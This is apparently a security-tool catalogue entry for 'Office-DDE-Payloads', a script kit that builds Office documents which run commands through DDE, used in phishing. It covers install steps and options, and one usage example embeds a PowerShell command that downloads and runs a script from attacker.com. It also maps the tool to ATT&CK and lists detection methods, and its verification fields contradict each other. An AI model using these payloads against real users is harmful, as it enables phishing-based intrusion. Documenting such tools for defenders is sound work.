---
id: 798b55d6-c7ad-409a-b71c-fc4c1a718fcd
name: Office-DDE-Payloads
type: tool
verified: true
created_at: '2019-08-28T21:17:27.608730+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Windows
tags:
  - dde
  - office
  - macroless
  - execution
  - phishing
url: 'https://github.com/fitbliss/office-dde-payloads'
validated: true
---

# Office-DDE-Payloads

**Status**: Unverified

## Overview

Office-DDE-Payloads is a collection of Python scripts and Microsoft Office templates designed to automate the creation of malicious documents exploiting the Dynamic Data Exchange (DDE) feature. This enables command execution without macros, bypassing traditional macro security controls in Word, Excel, and other Office applications. Commonly used in phishing campaigns for initial access.

## Description

The toolkit provides reusable scripts to embed DDE formulas into Office files, allowing arbitrary OS commands to run when the document is opened in vulnerable versions of Microsoft Office (pre-2016 with DDE enabled). It supports generating payloads for social engineering attacks, such as spear-phishing attachments that execute PowerShell or CMD commands upon user interaction.

## Features

- Feature 1: Template-based generation for Word (.doc), Excel (.xls), and PowerPoint (.ppt) with customizable DDE fields.
- Feature 2: Support for embedding complex commands, including PowerShell downloads and executions.
- Feature 3: Obfuscation options to disguise the DDE formulas in the document structure.
- Feature 4: Batch generation for multiple payload variants.

## Installation

### Requirements

- Python 3.6+
- Libraries: docx, openpyxl (install via pip)
- Microsoft Office installed for template validation (optional)

### Install Commands

```bash
# Clone the repository (assuming GitHub source)
git clone https://github.com/fitbliss/office-dde-payloads.git
cd office-dde-payloads

# Install Python dependencies
pip install -r requirements.txt
```

## Basic Usage

```bash
python generate_dde.py --help
```

### Common Options

| Option | Description |
|--------|-------------|
| -h, --help | Display help and usage information |
| --type | Specify Office application (word, excel, powerpoint) |
| --command | Command string to embed in DDE |
| --output | Output file path |
| --obfuscate | Apply basic obfuscation to DDE field |

## Examples

### Example 1: Basic Usage

Generate a simple Word payload to launch Calculator:

```bash
python generate_dde.py --type word --command "calc.exe" --output "simple_payload.doc"
```

### Example 2: Advanced Usage

Create an Excel payload that downloads and executes a remote script:

```bash
python generate_dde.py --type excel --command "powershell.exe -c \"IWR -Uri http://attacker.com/shell.ps1 -OutFile shell.ps1; .\shell.ps1\"" --output "remote_payload.xls" --obfuscate
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Malicious File]] User Execution: Malicious File
- [[T1566.001]] Phishing: Spearphishing Attachment

### Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution

## Detection

Indicators and methods for detecting this tool's usage:

- Detection method 1: Monitor for Office documents with embedded DDE fields using tools like oledump or strings analysis.
- Detection method 2: Enable Office macro/DDE blocking policies via Group Policy (Disable DDE in registry: HKCU\Software\Microsoft\Office\<version>\Word\Options\DDEEnabled=0).
- Detection method 3: Endpoint detection of unusual process spawns from winword.exe or excel.exe (e.g., spawning cmd.exe or powershell.exe).

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/Metasploit]]
- [[tools/Office-Macro-Generator]]

## References

- Official documentation: https://docs.microsoft.com/en-us/office/vba/api/overview/dynamic-data-exchange
- Related resources: MITRE ATT&CK - DDE Exploitation Techniques
